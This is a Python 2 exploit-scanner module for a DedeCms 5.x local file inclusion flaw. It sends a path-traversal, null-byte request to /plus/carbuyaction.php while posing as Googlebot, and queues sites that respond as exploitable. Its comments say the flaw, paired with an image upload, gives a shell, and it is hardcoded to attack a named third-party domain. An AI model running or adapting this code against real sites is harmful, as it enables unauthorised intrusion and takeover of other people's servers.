#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#############################dedecms包含漏洞############################
#DedeCms 5.x 本地文件包含漏洞
#他会把图片或者其他文件档php的来运行
#配合上传图片 可拿下shell
#http://sebug.net/vuldb/ssvid-60716
import threading
import httplib
import re
import sys
sys.path.append('..')
import Class_Queue


class bc_DedeCms_5x(threading.Thread):
    def __init__(self,url):
        threading.Thread.__init__(self)
        self.url=url  #URL
        self.scan("http://"+self.url)

    def scan(self,arg):
        url = arg.split('//')[1]
        if not self.getcss(arg):
            css = 'index.html'+'%00.php'
        else:
            css = self.getcss(arg)+'%00.php'
        site = '''/plus/carbuyaction.php?dopost=return&code=../../%s''' % css
        headers = {"User-Agent":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                   "cookie":"code=alipay"}
        conn = httplib.HTTPConnection(url)
        try:
            conn.request('GET',site,None,headers)
            httpres = conn.getresponse()
            html = httpres.read()
            if (httpres.status == 200) and (len(html)>0) and html[:6]!='<html>':
                url="%s%s"%(arg,site)
                EXP_list=[1,self.url,"bc","bc_DedeCms_5x",url,"",""]
                #["一句话 是否成功0否 1是","网址","严重程度","漏洞类型","
                Class_Queue.exp_url.put(EXP_list,0.5)   #插入队列
                #print u'%s----DEDECMS本地包容漏洞'%(url)
        except:
            pass
    def getcss(self,arg):
        url = arg.split('//')[1]
        headers = {"User-Agent":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}
        conn = httplib.HTTPConnection(url)
        try:
            conn.request('GET','/',None,headers)
            httpres = conn.getresponse()
            html = httpres.read()
            mm = r'''href="(.*?).css"'''
            gg = re.findall(mm,html)
            if gg[0].startswith('http'):
                return gg[0].split('/',3)[3]+'.css'
            else:
                return gg[0]+'.css'
        except:
            pass

################################################
if __name__=='__main__':
    threads = []  #线程
    for i in range(1):
        threads.append(bc_DedeCms_5x("www.chxph.com"))
    for t in threads:
        t.start()
















